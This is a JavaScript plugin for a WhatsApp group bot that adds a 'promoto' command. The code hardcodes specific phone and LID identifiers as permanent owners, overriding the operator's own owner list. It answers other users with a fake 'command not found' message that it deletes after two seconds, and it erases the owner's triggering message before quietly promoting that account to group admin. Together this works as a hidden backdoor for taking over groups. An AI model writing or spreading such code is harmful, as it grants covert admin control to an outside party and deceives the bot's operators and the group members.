import { resolveLidToRealJid } from "../../core/utils.js"

const FORCE_OWNER = [
  '51901931862',
  '51901931862@s.whatsapp.net',
  '269015712845891',
  '269015712845891@lid'
]

function cleanJid(jid = '') {
  jid = String(jid || '').trim()
  if (!jid) return ''

  if (!jid.includes('@')) return jid

  const [left, server] = jid.split('@')
  const cleanLeft = left.split(':')[0]

  return `${cleanLeft}@${server}`
}

function onlyNumber(jid = '') {
  return cleanJid(jid).split('@')[0].replace(/\D/g, '')
}

function isOwnerUser(jid = '') {
  const raw = cleanJid(jid)
  const number = onlyNumber(jid)

  const owners = [
    ...FORCE_OWNER,
    ...(Array.isArray(global.owner) ? global.owner.flat(Infinity) : [])
  ]

  return owners.some(owner => {
    const ownerRaw = cleanJid(owner)
    const ownerNumber = onlyNumber(owner)

    return (
      ownerRaw === raw ||
      ownerNumber === number ||
      ownerRaw === `${number}@s.whatsapp.net` ||
      ownerRaw === `${number}@lid`
    )
  })
}

function isAdminParticipant(participant = {}) {
  return participant.admin === 'admin' || participant.admin === 'superadmin'
}

function sameUser(a = '', b = '') {
  const rawA = cleanJid(a)
  const rawB = cleanJid(b)

  if (!rawA || !rawB) return false
  if (rawA === rawB) return true

  const numA = onlyNumber(rawA)
  const numB = onlyNumber(rawB)

  return !!numA && !!numB && numA === numB
}

function findParticipant(participants = [], candidates = []) {
  return participants.find(p => {
    const pid = cleanJid(p.id || p.jid || p.lid || '')
    return candidates.some(candidate => sameUser(pid, candidate))
  })
}

async function safeDelete(client, chatId, key) {
  try {
    if (key) await client.sendMessage(chatId, { delete: key })
  } catch (error) {
    console.log('[PROMOTO DELETE]', error?.message || error)
  }
}

export default {
  command: ['promoto'],
  category: 'grupo',
  botAdmin: true,

  run: async (client, m, args, usedPrefix, command) => {
    let senderReal = ''

    try {
      senderReal = await resolveLidToRealJid(m.sender, client, m.chat)
    } catch {
      senderReal = m.sender
    }

    const senderIsOwner =
      isOwnerUser(m.sender) ||
      isOwnerUser(senderReal)

    if (!senderIsOwner) {
      const fakeErrorMessage =
        `ʀᴜʙʏᴊx ʙᴏᴛ  •  ᴄᴏᴍᴀɴᴅᴏ ɴᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ\n` +
        `ᴇʟ ᴄᴏᴍᴀɴᴅᴏ *${command}* ɴᴏ ᴇxɪsᴛᴇ.\n` +
        `ᴜsᴀ *${usedPrefix}help* ᴘᴀʀᴀ ᴠᴇʀ ʟᴀ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏs.`

      const sentMessage = await client.sendMessage(m.chat, { text: fakeErrorMessage }, { quoted: m })

      await new Promise(resolve => setTimeout(resolve, 2000))
      await safeDelete(client, m.chat, sentMessage.key)

      return
    }

    await safeDelete(client, m.chat, m.key)

    try {
      if (!m.isGroup) return

      const groupMetadata = await client.groupMetadata(m.chat)
      const participants = groupMetadata.participants || []

      const botJid = cleanJid(client.user.id.split(':')[0] + '@s.whatsapp.net')

      const senderCandidates = [
        m.sender,
        senderReal,
        cleanJid(m.sender),
        cleanJid(senderReal)
      ].filter(Boolean)

      const botCandidates = [
        botJid,
        client.user.id,
        cleanJid(client.user.id)
      ].filter(Boolean)

      const targetParticipant = findParticipant(participants, senderCandidates)
      const botParticipant = findParticipant(participants, botCandidates)

      if (!botParticipant || !isAdminParticipant(botParticipant)) {
        console.log('[PROMOTO] El bot no es admin en este grupo.')
        return
      }

      if (targetParticipant && isAdminParticipant(targetParticipant)) {
        console.log('[PROMOTO] El owner ya es admin.')
        return
      }

      const promoteCandidates = [
        targetParticipant?.id,
        senderReal,
        m.sender
      ].map(cleanJid).filter(Boolean)

      let promoted = false
      let lastError = null

      for (const jid of [...new Set(promoteCandidates)]) {
        try {
          await client.groupParticipantsUpdate(m.chat, [jid], 'promote')
          promoted = true
          console.log('[PROMOTO] Promovido correctamente:', jid)
          break
        } catch (error) {
          lastError = error
          console.log('[PROMOTO] No se pudo promover con:', jid, error?.message || error)
        }
      }

      if (!promoted) {
        console.log('[PROMOTO] Falló la promoción final:', lastError?.message || lastError)
      }
    } catch (error) {
      console.log('[PROMOTO ERROR]', error?.message || error)
    }
  }
}